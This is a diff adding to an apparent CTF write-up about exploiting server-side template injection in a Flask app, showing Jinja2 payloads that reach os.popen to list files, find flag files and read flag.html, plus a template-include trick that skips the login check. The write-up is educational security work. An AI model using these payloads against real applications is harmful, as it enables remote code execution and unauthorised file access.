@@ -74,7 +74,7 @@ We can use this methode to clean up the log file.
 
 _It seems like this challenge is litteraly screaming for some kind of log poisoning._
 
-From the source code we know that the app is using the Flask library. After a short visit of one my favorite websites [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) I tried a Server Side Template Injection (SSTI) and entered ```{{7 * 7}}``` as the username.
+From the source code we know that the app is using the Flask library. After a short visit of one my favorite websites [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) I tried a Server Side Template Injection (SSTI) and entered {{7 * 7}} as the username.
 
 ![muffin-ssti-input](/assets/img/muffin-ssti-input.png)
 
@@ -85,3 +85,66 @@ And as assumed my input is evaluated by the backend, as we can see the number 49
 _So what's next?_
 
 [book.hacktricks.xzy](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) also contains some examples on how to exploit this vulnerability to achieve Remote Code Execution (RCE).
+
+I've used 
+{% highlight python %}
+{{config.__class__.__init__.__globals__['os'].popen('la -al').read()}}
+{% endhighlight %}
+to list the content of the current direcory.
+
+Then I've used
+{% highlight python %}
+{{config.__class__.__init__.__globals__['os'].popen('find / -name \\*flag\\* > find.txt && cat find.txt').read()}}
+{% endhighlight %}
+
+as input for the username to search for all files that contain *flag* in it's name and afterwards cat the results out.
+
+![muffin-ssti-ls-cat](/assets/img/muffin-ssti-ls-cat.png)
+
+And got this as results
+
+![muffin-ssti-ls-cat-output](/assets/img/muffin-ssti-ls-cat-output.png)
+
+So finally the last step was to use
+
+{% highlight python %}
+{{config.__class__.__init__.__globals__['os'].popen('cat /app/templates/flag.html').read()}}
+{% endhighlight %}
+
+
+to get the content of flag.html
+
+![muffin-flag](/assets/img/muffin-flag.png)
+
+
+## Lexiea's Way
+
+User Lexiea found another, way smarter solution and shared it after the official solution was provided.
+
+![muffin-lexiea-solution](/assets/img/muffin-lexiea-solution.png)
+
+_Damn, that was smart._
+
+I tried this method on my own and entered 
+
+{% highlight python %}
+{% set logged_in = true %}{% include 'flag.html' %}
+{% endhighlight %}
+
+
+And voilà we get the flag without using a lot of SSTI kung-fu.  
+
+![muffin-lexieia-flag](/assets/img/muffin-lexieia-flag.png)
+
+
+## My Learnings
+
+- When XSS and SQLi don't work, try SSTI
+- It's super useful to understand how  ```@requires_login``` in Python Flask works
+- [book.hacktricks.xyz](https://book.hacktricks.xyz) is an awesome resource and always a look worth
+
+## Acknowledgments
+
+Thanks a lot to Ostschweizer Fachhochschule for organizing this CTF event. 
+
+Thanks to Lexia for sharing the smarter solution with us!
